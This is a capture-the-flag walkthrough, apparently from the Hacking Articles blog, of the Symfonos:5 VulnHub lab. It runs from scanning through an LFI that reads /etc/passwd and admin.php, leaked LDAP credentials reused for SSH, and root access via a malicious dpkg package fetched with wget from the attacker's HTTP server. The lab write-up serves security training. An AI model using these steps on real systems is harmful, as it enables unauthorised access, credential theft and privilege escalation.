<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Symfonos:5 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/symfonos5-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-01-20T07:38:15+00:00">January 20, 2020</time><time class="updated" datetime="2025-06-10T20:10:47+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This is another post on vulnhub CTF “named as “symfonos” by Zayotic. It is designed for VMware platform, and it is a boot to root challenge where you have to find flags to finish the task assigned by the author.</span></p>
<p><span style="color: #000000;">You can download it from here: <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/symfonos-5,415/">https://www.vulnhub.com/entry/symfonos-5,415/</a></span></strong></span></p>
<p><span style="color: #000000;">Level: Intermediate</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodologies</strong></span></h3>
<p><strong><span style="color: #000000;">Scanning</span></strong></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><strong><span style="color: #000000;">Enumeration</span></strong></p>
<ul>
<li><span style="color: #000000;">Abusing HTTP</span></li>
<li><span style="color: #000000;">Dirb</span></li>
</ul>
<p><strong><span style="color: #000000;">Exploiting LFI</span></strong></p>
<ul>
<li><span style="color: #000000;">Burp suite</span></li>
</ul>
<p><strong><span style="color: #000000;">Privilege Escalation</span></strong></p>
<ul>
<li><span style="color: #000000;">Exploiting Dpkg</span></li>
</ul>
<h3><span style="color: #800000;">Walkthrough</span></h3>
<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
<p><span style="color: #000000;">Let’s start off with the scanning process. This target VM took the IP address of 192.168.0.112 automatically from our local wifi network.</span></p>
<p><span style="color: #000000;">Then we used Nmap for port enumeration. We found that port 22 for SSH, 80 for HTTP,389 and 636 for ldap are open.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.0.112</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TdkXMmfwE2E/XiVV02hCETI/AAAAAAAAiP0/kicJhjHsFPMjX_0g-YR4C9sAQFUu-8egwCLcBGAsYHQ/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">As port 80 is open, we tried to open the IP address in our browser, but we didn’t find anything useful on the webpage.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kEXvy3xW2Xg/XiVV2PA-K1I/AAAAAAAAiQA/H7Y2CkVpbOUQoEjXi08cIWMVCt4Tbw9gACLcBGAsYHQ/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Further, we use dirb for directory brute-forcing and found /admin.php page with status code 200 OK on executing following command.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.0.112</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eBcX3FU1xIE/XiVV2RvvZeI/AAAAAAAAiQE/ev79-magF5k1KEzycCfhfQGGyvJtVQXIACLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">When we searched the above-listed web page, i.e./admin.php; we got a login page, but we don’t know the login credential, so we try to bypass the login page by using the SQL injection and brute force attack, but unfortunately nothing was achieved.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DHyRdnj6LD8/XiVV2eLtW3I/AAAAAAAAiQI/Bv_nKO5AHeUyi5oNGX6W6KYt4Kh2Cu4sgCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Therefore, further, we use burpsuite and intercept the browser request of the current webpage for analyzing its request. We sent the request to the repeater and gently found a suspicious hyperlink inside its burp response.</span></p>
<p><span style="color: #000000;">We feel there are possibilities of LFI just because the URL is connecting with localhost for portraits.php file as shown in the given image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CzAWXDX5K3M/XiVV3WySKFI/AAAAAAAAiQM/a3SogccoEbs7Oqcfyt8fGUds5sePpWgwgCLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">To ensure the possibility of LFI vulnerability we try to pull “/etc/passwd” file by fuzzing the parameter “/home.php?url=” and it works successfully as expected to be.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_GY908ixu_E/XiVV3f9RYYI/AAAAAAAAiQQ/ZGXJj7MLVfgnliYUEbPqp3uA_AZZgjRfQCLcBGAsYHQ/s1600/8.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploit LFI</strong></span></h3>
<p><span style="color: #000000;">As a result we successfully got the content of “admin.php” file by exploiting LFI by fuzzing the same parameter. As we knew the http://192.168.0.112/admin.php webpage requires login credential and here we found credential “username: admin” and “password: qMDdyZh3cT6eeAWD” which is actually used to connect with LDAP.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DRmpIoncbZw/XiVV3vK12XI/AAAAAAAAiQU/mKezrYpfvYYW8Floi9dYGYD50As22SfMQCLcBGAsYHQ/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Further, we used nmap for LDAP enumeration and run following command, and as a result we found user information including password.</span></p>
<pre class="lang:default decode:true">nmap 192.168.0.112 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"'</pre>
<pre class="lang:default decode:true">zeus
cetkKf4wCuHC9FET</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UNiB6OmFcT0/XiVV03AZ_YI/AAAAAAAAiPw/og2fn8pCE6omR_ZvuzXnrwJyu7u8jorxgCLcBGAsYHQ/s1600/11.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Thus, we used the user zeus credential as enumerated above to access the ssh shell of the host machine and check sudo rights for him. We found zeus has sudo permission to run dpkg as root thus we abuse zeus sudo rights for privilege escalation by exploiting dpkg functionality.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LeG7XwJtaHc/XiVV0zK8UrI/AAAAAAAAiPs/4vU6g1MLWOsS6O0kF8qe32XjLiAzEUsxACLcBGAsYHQ/s1600/12.png"/></span></p>
<p><span style="color: #000000;">As we Dpkg is package installer just like apt in Linux like operating system and so here we are going to craft a Debian package with the help fpm transfer on the host machine to get the privilege shell.</span></p>
<pre class="lang:default decode:true">mkdir ignite
cd ignite
nano shell.sh</pre>
<p><span style="color: #000000;">write following code in the shell.sh file and save it.</span></p>
<pre class="lang:default decode:true"> #!/bin/bash
/bin/bash</pre>
<p><span style="color: #000000;">Install fpm in your local machine and run following command to generate a Debian package for shell.sh file.</span></p>
<pre class="lang:default decode:true">fpm -s dir -t deb -n exploit –before-install shell.sh ./
ls
python -m SimpleHTTPServer</pre>
<p><span style="color: #000000;"><strong><em>Note: You will need to install FPM on your machine.</em></strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-a7twLDgvUNA/XiVV1sNGzWI/AAAAAAAAiP4/_8XiGuU42e0FiAVrQb0dftQ8iyuSjsjsgCLcBGAsYHQ/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Once the malicious deb package gets generated download it on the host machine and install the package as root. To perform privilege escalation run the following command and you get privilege where you found the proof.txt as shown in the given image.</span></p>
<pre class="lang:default decode:true">wget http://192.168.0.114:8000/exploit_1.0_amd64.deb
sudo -u root /usr/bin/dpkg -i exploit_1.0_amd64.deb
id
cd /root
cat proof.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-unTUJrRGaE4/XiVV13pn20I/AAAAAAAAiP8/eIGXkp0nERUyFI1cNgNm-U21jtnNEnb0QCLcBGAsYHQ/s1600/14.png"/></span></p>
<p><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on <strong>Twitter</strong> and <strong><a href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
